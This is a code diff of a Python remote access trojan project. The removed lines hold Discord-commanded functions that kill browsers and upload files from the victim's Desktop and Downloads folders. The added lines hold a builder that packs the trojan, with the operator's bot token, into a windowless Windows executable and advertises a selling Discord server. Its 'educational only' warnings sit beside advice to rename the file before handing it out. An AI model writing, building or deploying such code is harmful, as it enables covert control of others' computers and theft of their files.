-            await interaction.response.send_message("Command executed.")
-
-    async def kill_browsers(self, interaction: discord.Interaction):
-        try:
-            browsers = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'iexplore.exe']
-            for browser in browsers:
-                subprocess.run(['taskkill', '/f', '/im', browser])
-            await interaction.response.send_message("All browsers killed.")
-        except:
-            await interaction.response.send_message("Command executed.")
-
-    async def pc_dump(self, interaction: discord.Interaction):
-        await interaction.response.defer()
-        
-        zip_name = "Fynox.zip"
-        try:
-            with zipfile.ZipFile(zip_name, 'w') as zipf:
-                for folder in [os.path.expanduser('~\Desktop'), os.path.expanduser('~\Downloads')]:
-                    if os.path.exists(folder):
-                        for root, dirs, files in os.walk(folder):
-                            for file in files[:50]:
-                                try:
-                                    file_path = os.path.join(root, file)
-                                    zipf.write(file_path, os.path.relpath(file_path, folder))
-                                except:
-                                    pass
-            
-            await interaction.followup.send(file=discord.File(zip_name))
-            os.remove(zip_name)
-        except:
-            await interaction.followup.send("PC dump completed.")
-
-class PageModal(discord.ui.Modal, title="Go to Page"):
-    def __init__(self, view):
-        super().__init__()
-        self.view = view
-        
-    page_number = discord.ui.TextInput(
-        label="Page Number",
-        placeholder=f"Enter 1-{view.total_pages}",
-        min_length=1,
-        max_length=1
-    )
+    # Create temporary file in memory and immediately use it for building
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as temp_file:
+        temp_file.write(source_code)
+        temp_file_path = temp_file.name
     
-    async def on_submit(self, interaction: discord.Interaction):
+    build_cmd = [
+        "pyinstaller",
+        "--onefile",
+        "--noconsole",
+        "--name", "Fynox-RAT",
+        "--icon", "fynox.ico",
+        "--hidden-import", "win32gui",
+        "--hidden-import", "win32con",
+        "--hidden-import", "win32api",
+        "--hidden-import", "win32process",
+        "--hidden-import", "win32com.client",
+        "--hidden-import", "win32net",
+        "--hidden-import", "win32security",
+        "--add-data", "fynox.ico;.",
+        temp_file_path
+    ]
+    
+    try:
+        subprocess.check_call(build_cmd)
+        
+        # Clean up all temporary files immediately
+        print(f"{Colors.YELLOW}[!] Cleaning up build artifacts...{Colors.RESET}")
         try:
-            page = int(self.page_number.value)
-            if 1 <= page <= self.view.total_pages:
-                self.view.current_page = page
-                self.view.update_buttons()
-                embed = discord.Embed(
-                    title="🎮 Control Panel",
-                    description=f"Remote access controls activated - Page {page}/{self.view.total_pages}",
-                    color=discord.Color.red()
-                )
-                embed.add_field(name="Navigation", value="Use Next/Back buttons or Page selector", inline=False)
-                await interaction.response.edit_message(embed=embed, view=self.view)
-            else:
-                await interaction.response.send_message(f"❌ Invalid page. Please enter 1-{self.view.total_pages}", ephemeral=True)
-        except ValueError:
-            await interaction.response.send_message("❌ Please enter a valid number", ephemeral=True)
+            if os.path.exists("build"):
+                shutil.rmtree("build")
+            if os.path.exists(temp_file_path):
+                os.remove(temp_file_path)
+            if os.path.exists("fix_ssl.bat"):
+                os.remove("fix_ssl.bat")
+            if os.path.exists("Fynox-RAT.spec"):
+                os.remove("Fynox-RAT.spec")
+            print(f"{Colors.GREEN}[+] Build artifacts removed{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.YELLOW}[!] Cleanup warning: {e}{Colors.RESET}")
+        
+        exe_path = os.path.join("Finished-RAT", "Fynox-RAT.exe")
+        if os.path.exists(exe_path):
+            # Create SSL fix batch file
+            ssl_fix_bat = '''@echo off
+python -m pip install --upgrade certifi urllib3
+python -c "import certifi; print('SSL certificates updated')"
+pause
+'''
+            with open('fix_ssl.bat', 'w') as f:
+                f.write(ssl_fix_bat)
+            return exe_path
+        else:
+            return None
+    except subprocess.CalledProcessError as e:
+        print(f"{Colors.RED}[-] Build failed: {e}{Colors.RESET}")
+        return None
+
+def show_warnings():
+    """Display security warnings"""
+    print(f"{Colors.RED}{Colors.BOLD}")
+    print("    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+    print("    ┃                 ⚠️  IMPORTANT WARNINGS ⚠️                  ┃")
+    print("    ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫")
+    print("    ┃ 1. NEVER run the generated executable on your own system!  ┃")
+    print("    ┃ 2. This tool is for educational purposes only!             ┃")
+    print("    ┃ 3. Always test in a controlled environment!                ┃")
+    print("    ┃ 4. The creator is not responsible for misuse!              ┃")
+    print("    ┃                                                            ┃")
+    print("    ┃    Made by ._changed_ - .gg/starselling - guns.lol/xup     ┃")
+    print("    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+    print(f"{Colors.RESET}")
+
+
+def show_main_menu():
+    clear_screen()
+    ctypes.windll.kernel32.SetConsoleTitleW("Fyxon RAT Builder - .gg/starselling - guns.lol/xup - made by ._changed_")
+    
+    print(f"{Colors.CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{Colors.RESET}")
+    print(f"{Colors.CYAN}┃                  FYXON RAT BUILDER                   ┃{Colors.RESET}")
+    print(f"{Colors.CYAN}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{Colors.RESET}") 
+    print(f"{Colors.CYAN}┃ Made by ._changed_ - .gg/starselling - guns.lol/xup  ┃{Colors.RESET}")
+    print(f"{Colors.CYAN}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{Colors.RESET}")    
+    print(f"{Colors.CYAN}┃        [1] Build RAT                                 ┃{Colors.RESET}")
+    print(f"{Colors.CYAN}┃        [2] Support Discord                           ┃{Colors.RESET}")     
+    print(f"{Colors.CYAN}┃                                                      ┃{Colors.RESET}")
+    print(f"{Colors.CYAN}┃        [CTRL + C] Exit                               ┃{Colors.RESET}")
+    print(f"{Colors.CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{Colors.RESET}")
+    print()
+    
+    choice = input(f"{Colors.YELLOW}Select option: {Colors.RESET}").strip()
+    return choice
+
+def open_discord_support():
+    webbrowser.open("https://discord.gg/starselling")
+
+
+def main():
+    while True:
+        choice = show_main_menu()
+        
+        if choice == "1":
+            build_rat_process()
+        elif choice == "2":
+            open_discord_support()
+        else:
+            input(f"{Colors.RED}[-] Invalid option! Press Enter to try again...{Colors.RESET}")
+
+def build_rat_process():
+    clear_screen()
+    print_banner()
+    
+    show_warnings()
+    
+    # Get configuration from user
+    print(f"{Colors.CYAN}[!] Configuration Setup{Colors.RESET}")
+    bot_token = input(f"{Colors.YELLOW}[?] Discord Bot Token: {Colors.RESET}").strip()
+    channel_id = input(f"{Colors.YELLOW}[?] Log Channel ID: {Colors.RESET}").strip()
+    
+    if not bot_token or not channel_id:
+        print(f"{Colors.RED}[-] Token and Channel ID are required!{Colors.RESET}")
+        return
+    
+    # Create icon
+    create_fynox_ico()
+
+    github_code = fetch_main_from_github()
+    if not github_code:
+        print(f"{Colors.RED}[-] Failed to fetch main.py{Colors.RESET}")
+        return
+    
+    # Build executable directly without creating source file
+    source_code = create_source_code(bot_token, channel_id, github_code)
+    
+    # Install requirements
+    install_requirements()
+    clear_screen()
+    
+    # Build executable
+    print(f"{Colors.CYAN}[+] Started{Colors.RESET}")
+    exe_path = build_executable_from_memory(source_code)
+    if exe_path:
+        clear_screen()
+        print_banner()
+        print(f"{Colors.GREEN}{Colors.BOLD}")
+        print("    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
+        print("    ┃                    🎉 BUILD SUCCESSFUL! 🎉                ┃")
+        print("    ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫")
+        print("    ┃ 📁 Executable: dist\Fynox-RAT.exe                          ┃")
+        print("    ┃                                                              ┃")
+        print("    ┃ ⚠️  IMPORTANT REMINDERS:                                  ┃")
+        print("    ┃ • Rename the file if needed                                ┃")
+        print("    ┃ • Test only in controlled environment                      ┃")
+        print("    ┃ • Never run on your own system!                            ┃")
+        print("    ┃ • Use responsibly and ethically!                           ┃")
+        print("    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
+        print(f"{Colors.RESET}")
+        
+        # Open dist folder in Windows Explorer
+        dist_path = os.path.join(os.getcwd(), "dist")
+        subprocess.run(['explorer', dist_path])
+    else:
+        print(f"{Colors.RED}[-] Build failed!{Colors.RESET}")    
 
 if __name__ == "__main__":
-    bot.run(TOKEN)
+    try:
+        main()
+    except KeyboardInterrupt:
+        clear_screen()        
+        print(f"\n\n\n\n\n\n\n\n{Colors.RED}[!] Build cancelled by user{Colors.RESET}")
+    except Exception as e:
+        clear_screen()     
+        print(f"\n\n\n\n\n\n\n\n{Colors.RED}[-] An error occured! Please contact the developer!{Colors.RESET}\n")
+        print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
+    finally:
+        input(f"{Colors.CYAN}[+] Press Enter to exit...{Colors.RESET}")
